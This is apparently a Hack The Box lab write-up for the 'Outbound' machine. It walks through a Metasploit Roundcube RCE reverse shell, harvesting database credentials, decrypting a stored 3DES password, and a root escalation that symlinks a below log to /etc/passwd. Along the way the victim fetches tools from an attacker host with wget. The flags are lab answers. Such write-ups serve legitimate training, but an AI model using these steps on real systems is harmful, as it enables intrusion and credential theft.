# HTB - Outbound
Author /Link: https://app.hackthebox.com/machines/Outbound
OS: `Linux`
Difficulty: <span class="badge badge-low">Easy</span> 
IP: `10.10.11.77`
Created: 24-Nov-2025
Updated: `$= dv.current().file.mtime.toFormat("d-MMM-yyyy")`
- - -
> [!info] Information
As is common in real life pentests, you will start the Outbound box with credentials for the following account:
tyler : LhKL1o9Nm3X2

### Learned
>1. Using Roundcube exploit in Metasploit.
>2. How to enumerate Roundcube (config) files.
>3. Recognizing and decrypting 3DES encryption using Cyberchef.
>4. Exploiting `/var/log/below` permissions with a python script.

### Nmap
```shell
$ nmap -sV 10.10.11.77
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu
```

### Services
```log
22 - SSH
80 - HTTP
```

### Attack Chain
First we begin with a Nmap portscan:
```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.10.11.77
<SNIP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0
```

We can open a browser and visit the ip, which redirects to `mail.outbound.htb`.
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts
# Add the next line, it will add 2 domains on this IP:
10.10.11.77     mail.outbound.htb outbound.htb
```

Now visiting the website we see it runs `Roundcube`.
We use the login that was given at te start `tyler : LhKL1o9Nm3X2`.
Inside we click on the `?` in the button left corner to find the version `Roundcube Webmail 1.6.10`

This roundcube version is vulnerable to Remote Code Execution: `CVE-2025-49113`
An article about this exploit can be found at https://www.offsec.com/blog/cve-2025-49113/
And the exploit code at:
https://github.com/fearsoff-org/CVE-2025-49113/blob/main/CVE-2025-49113.php

However, this exploit has also been added to `Metasploit` and we will use it from there.

#### User: Tyler
##### Metasploit reverse shell
```sh
┌──(kali㉿kali)-[~]
└─$ msfconsole -q             # Below are the commands in order
msf > search roundcube
msf > use 0                   # The exploit we want to use 
msf exploit > options                 # Check what we need to set
msf exploit > set USERNAME tyler
msf exploit > set PASSWORD LhKL1o9Nm3X2
msf exploit > set RHOSTS mail.outbound.htb    # Victim address
msf exploit > set LHOST tun0                  # Our VPN IP (tun0)
msf exploit > run
# This will run and create a meterpreter connection
meterpreter > getuid
Server username: www-data # We are now this user
# We upgrade our shell to see things better
meterpreter > shell
# Now type
script /dev/null -c bash
# Which gives us a shell to work with
www-data@mail:/$
www-data@mail:/$ ls /home
jacob  mel  tyler           # Found 3 users, sadly we dont have permissions to open them
```

We see a file that gives away that we are inside a docker container and found 3 users,
maybe we need to escape it to the server.?
Let's check the files of the `Roundcube Docker Container` we just broke:
```sh
www-data@mail:~/$ cd /var/www/html/roundcube/config # Location of config files
www-data@mail:~/html/roundcube/config$ cat config.inc.php
<SNIP>
# Database connection string (DSN)
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
<SNIP>
# Key to encrypt the user's imap password stored in the session record.
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

To keep things organized this is what we found:
1. MySQL is running on localhost
2. The credentials are
   - User: `roundcube`
   - Pass: `RCDBPass2025`
   - Auth_secret: `DpYqv6maI9HxDL5GhcCd8JaQQW`
   - A DES key: `rcmail-124ByteDESkey*Str`
    which is used by MySQL.

##### MySQL Enumeration
```shell
www-data@mail:~/$ mysql -u roundcube -pRCDBPass2025 # Connecting to MySQL on localhost
# This gains us entry and we can start enumerating
MariaDB [(none)]> #
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          | # This one
+--------------------+

MariaDB [(none)]> use roundcube # Select the database
MariaDB [roundcube]> show tables
+---------------------+
| Tables_in_roundcube |
+---------------------+
|<SNIP>               |
| session             | # Check for session info
|<SNIP>               |
| users               | # Check for users and maybe more
+---------------------+

MariaDB [roundcube]> select * from users # Get everything stored in the 'users' table
+----------+-----------------------------------------------------------+
| username | preferences                                               |
+----------+---------+-------------------------------------------------+
| jacob    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
| mel      | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
| tyler    | a:2:{s:11:"client_hash";s:16:"lquzjr3ru4qiIWRb";i:0;b:0;} |
+----------+-----------------------------------------------------------+
```

Inside table `session` we find 1 short and 1 very large string we can try to decode
Using cyberchef's ~magic~ auto-decode we get plaintext returning us some info
- User: `jacob`
- Pass: `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`    -> probably encrypted.
For good measure we can try the credentials within roundcube or in our shell.
```sh
MariaDB [roundcube]> exit # Exit the MySQL connection
exit
bye
www-data@mail:/$ su jacob # Switch user
Password: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
# as expected no luck, dead end. The same for using it on the roundcube login page
```

We need to try and find out this encryption..!

##### Password cracking
So, guessing the password might be encrypted.. 
Googling "[how does roundcube encrypt](https://letmegooglethat.com/?q=how+does+roundcube+encrypt)"  tells us it is probably DES3,
and shows a [decryption tool](https://zerodumb.dev/tools/decrypt-roundcube/) script aswell!

Another way is through [Cyberchef](https://gchq.github.io/CyberChef/). In the searchbar type `Triple DES Decrypt` and use it.
>[!info] Cyberchef Triple Des Decrypt
>First use the password string `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` 
>as input and convert it `from base64` `to hex`.
>>2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf
>
>Which we then use as our new input, clearing the recipe 
>and using our previous output as new input.
>We need to split our string into the first 8 bytes which will become our "IV".
>The remainder of the string becomes our "Key".
>
>>`Triple Des Decrypt`
>>Key:      09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf     # Hex string tail after IV removal below
>>IV:         2f b4 6f d3 40 3c 4e ec                    # Use the first 8 bytes from the hex string 
>>Mode:   CBC
>>Input:    Hex
>>Output: Raw
>
>
>Now Cyberchef cooks up our decrypted password `595mO8DmwGeD`

---
#### User: Jacob
##### Enumeration
Use the decrypted password on the Roundcube login page where we can now log in.
![[Pasted image 20251126003016.png]]

In Jacob's mailbox we find 2 emails:
>[!info]- 1. Unexpected Resource Consumption (Expand)
>From mel@outbound.htb on 2025-06-08 08:09
>
>We have been experiencing high resource consumption on our main server.
>For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
>Please inform us immediately if you notice any irregularities.
>
>Thanks!
>
>Mel

>[!info]- 2. Important Update (Expand)
>From tyler@outbound.htb on 2025-06-07 10:00
>
>Due to the recent change of policies your password has been changed.
>
>Please use the following credentials to log into your account: gY4Wr3a1evp4
>
>Remember to change your password when you next log into your account.
>
>Thanks!
>
>Tyler

From these mails we understand that Jacob has privileges to see logs, which might help.
And we find a password aswell which we can try on SSH.
##### SSH Access & User Flag
```Shell
┌──(kali㉿kali)-[~]
└─$ ssh jacob@10.10.11.77
jacob@10.10.11.77s password:       # 595mO8DmwGeD
jacob@outbound:~$ ls
user.txt
jacob@outbound:~$ cat user.txt
e8a7ef82f230cbf066d0cd390440996d# Found our first flag!
```

###### Further Enumeration + LinPEAS
```Shell
# We can try to check for sudo permissions
jacob@outbound:~$ sudo -l
<SNIP>
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below * <SNIP>  # We can run the "below" command as root!

jacob@outbound:~$ sudo below # When running the command, a taskmanager appears.
# We cant do much here but watch the system.
```

Lets continue enumerating with linpeas.
```Shell
# Attacking machine
┌──(kali㉿kali)-[~]
└─$ linpeas           # Preinstalled on Kali, brings us to the folder holding the .sh file
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8080 # Create server to upload from

# Victim machine
jacob@outbound:~$ cd /tmp
jacob@outbound:/tmp$ wget http://<Attacker_IP>:8080/linpeas.sh # This will download Linpeas to the victim machine
# When received, close the python http server on your attacking machine.
jacob@outbound:/tmp$ chmod +x linpeas.sh # Make the file executable
jacob@outbound:/tmp$ ./linpeas.sh # Runs the linpeas.sh from our current location.
# We know that we got access to some logs so we might get lucky there.
<SNIP>
╔══════════╣ Interesting writable files owned by me or writable by everyone
/var/log/below
/var/log/below/error_jacob.log
/var/log/below/error_root.log
<SNIP>
```

We found 1 folder containing 2 log files with write permissions.
Searching google for `/var/log/below exploit` brings us to the following exploit on github:
https://github.com/BridgerAlderson/CVE-2025-27591-PoC

In here are instructions[^1] using almost the same method as linpeas to upload and run the exploit.
```sh
# Attacking machine
┌──(kali㉿kali)-[~/Desktop]
└─$ git clone https://github.com/BridgerAlderson/CVE-2025-27591-PoC
  $ cd CVE-2025-27591-PoC
  $ python3 -m http.server 8080  # Again, close the server when done uploading

# Victim machine
jacob@outbound:/tmp$ wget http://<Attacker_IP>:8080/exploit.py
jacob@outbound:/tmp$ python3 exploit.py # Runs the exploit
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Nov 26 13:05:53.433 DEBG Starting up!
Nov 26 13:05:53.433 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01764115200: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...
root@outbound:/tmp# We just became root
```
#### User: Root
From here it becomes easy as we just gained root access! Hurray!
```shell
root@outbound:/tmp$ cd
root@outbound:~$ ls
root.txt
root@outbound:~# cat root.txt
915b2574ec7ac1373d5f05c61be0bd64 # Got the root flag!
```


---
[^1]: Look for "Proof-Of-Concept" on the page.
